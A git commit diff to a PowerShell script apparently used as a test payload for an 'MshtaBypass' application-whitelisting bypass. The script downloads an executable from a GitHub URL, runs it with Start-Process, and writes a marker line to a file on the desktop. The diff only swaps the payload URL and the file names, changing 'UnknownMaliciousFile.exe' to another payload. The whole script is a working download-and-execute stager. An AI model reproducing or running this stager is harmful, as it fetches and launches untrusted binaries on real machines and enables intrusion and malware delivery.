bf846c9e87f5567d18ba1386ac5031e602e6e607
NotSurprised <roro8016489@gmail.com>
2020-06-30 17:14:31 +0800

    20200630

--- Payload/MshtaBypass/MshtaHta.ps1
+++ Payload/MshtaBypass/MshtaHta.ps1
@@ -1,5 +1,5 @@
-$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/ReceiptAutoClose.exe'
-$output = "UnknownMaliciousFile.exe"
+$url = 'https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/MshtaBypass/MshtaHtaOnlinePayload.exe'
+$output = "MshtaHtaOnlinePayloadDownloaded.exe"
 $start_time = Get-Date
 
 [ Net.ServicePointManager ]::SecurityProtocol  = [Net.SecurityProtocolType]::Tls12 
@@ -8,6 +8,6 @@ wget $url -outfile $output
 
 Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
-Start-Process -FilePath "UnknownMaliciousFile.exe"
+Start-Process -FilePath "MshtaHtaOnlinePayloadDownloaded.exe"
 
 $DesktopPath = [Environment]::GetFolderPath('Desktop');echo "MshtaHtaBypass" >> $DesktopPath\\WLtester.txt
